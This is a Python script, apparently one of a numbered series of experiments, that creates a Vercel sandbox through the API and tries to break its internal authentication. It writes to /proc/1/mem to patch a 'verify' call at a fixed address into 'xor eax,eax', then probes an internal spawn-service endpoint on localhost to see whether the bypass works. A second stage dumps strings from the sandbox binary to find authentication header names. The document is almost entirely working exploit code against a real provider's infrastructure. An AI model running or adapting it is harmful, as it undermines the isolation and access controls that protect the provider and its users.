# 实验J230: (A)patch wrapunary call verify -> xor eax,eax 认证绕过测试
# (B)dump认证header名备选 (C)init.sock矩阵(独立cmd)
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=40000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 120})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj230"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# A) patch 认证绕过
CODE = r'''
import os, time, subprocess, sys
out = open("/tmp/d230a.txt", "w")
def p(*a):
    line = " ".join(str(x) for x in a)
    out.write(line + "\n"); out.flush()
    print(line, flush=True)

fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
def wa(a, b):
    os.lseek(fd, a, 0)
    return os.write(fd, b)

# 0x83afe0: call 0x83b3a0 (5B) -> xor eax,eax; nop;nop;nop
old = ra(0x83afe0, 5)
p("OLD", old.hex())
try:
    n = wa(0x83afe0, bytes.fromhex("31c0909090"))
    p("WR", n)
except OSError as e:
    p("WR_ERR", repr(e))
new = ra(0x83afe0, 5)
p("NEW", new.hex())

# 也把第二个 verify 相关调用点附近检查 (0x83b3a0 前面是否有其他 call)
p("CTX", ra(0x83afd0, 0x30).hex())

# verify 是否被调用的观察点: 0xe9e610 (pub slice 懒加载位)
def g(addr):
    b = ra(addr, 0x18)
    import struct
    ptr, ln, cap = struct.unpack_from("<QQQ", b)
    return hex(ptr), ln, cap
p("G_BEFORE", g(0xe9e610))

# 子进程发 POST (connect JSON) 到 30001 -> 认证绕过则活且有响应
POSTER = ('import urllib.request; '
          'req=urllib.request.Request("http://127.0.0.1:30001/vercel.sandbox.spawn.v1.SpawnService/Ping", '
          'data=b"{}", method="POST"); '
          'req.add_header("Content-Type", "application/json"); '
          'req.add_header("Connect-Protocol-Version", "1"); '
          'try:\n'
          ' r=urllib.request.urlopen(req, timeout=5); print("HTTP", r.status, r.read()[:300])\n'
          'except Exception as e:\n'
          ' print("EXC", type(e).__name__, str(e)[:200])')
r = subprocess.run([sys.executable, "-c", POSTER], capture_output=True, text=True, timeout=12)
p("POST_RC", r.returncode)
p("POST_OUT", (r.stdout + r.stderr).strip()[:400].replace("\n", "|"))
time.sleep(1)
p("G_AFTER", g(0xe9e610))
os.close(fd)
p("doneA")
out.close()
'''
st = run_cmd(sid, CODE, "J230A", timeout=200)
time.sleep(1)
bashfile(sid, "cat /tmp/d230a.txt", "OUT_A", 20000)

# B) dump header 名 (0x9EF056 区) + 错误消息字符串
CODE2 = r'''
import os, struct
out = open("/tmp/d230b.txt", "w")
def p(*a):
    line = " ".join(str(x) for x in a)
    out.write(line + "\n"); out.flush()
    print(line, flush=True)

data = open("/tmp/si", "rb").read()
phoff = struct.unpack_from("<Q", data, 0x20)[0]
phentsz = struct.unpack_from("<H", data, 0x36)[0]
phnum = struct.unpack_from("<H", data, 0x38)[0]
segs = []
for i in range(phnum):
    off = phoff + i * phentsz
    p_type, p_flags = struct.unpack_from("<II", data, off)
    p_offset, p_vaddr = struct.unpack_from("<QQ", data, off + 8)
    p_filesz, p_memsz = struct.unpack_from("<QQ", data, off + 0x20)
    segs.append([p_type, p_flags, p_offset, p_vaddr, p_filesz, p_memsz])

def v2f(v):
    for pt, pf, po, pv, pfs, pms in segs:
        if pt == 1 and pv <= v < pv + pfs:
            return po + (v - pv)
    return None

for v, n in ((0x9ef040, 0xa0), (0x9f1dd0, 0x60), (0x9f60d0, 0x70)):
    f = v2f(v)
    if f is None:
        p("STR_NOSEG", hex(v))
        continue
    raw = data[f:f+n]
    s = "".join(chr(c) if 32 <= c < 127 else "." for c in raw)
    p("STR", hex(v), repr(s))
    p("HEX", hex(v), raw.hex())
p("doneB")
out.close()
'''
st = run_cmd(sid, CODE2, "J230B", timeout=200)
time.sleep(1)
bashfile(sid, "cat /tmp/d230b.txt", "OUT_B", 10000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
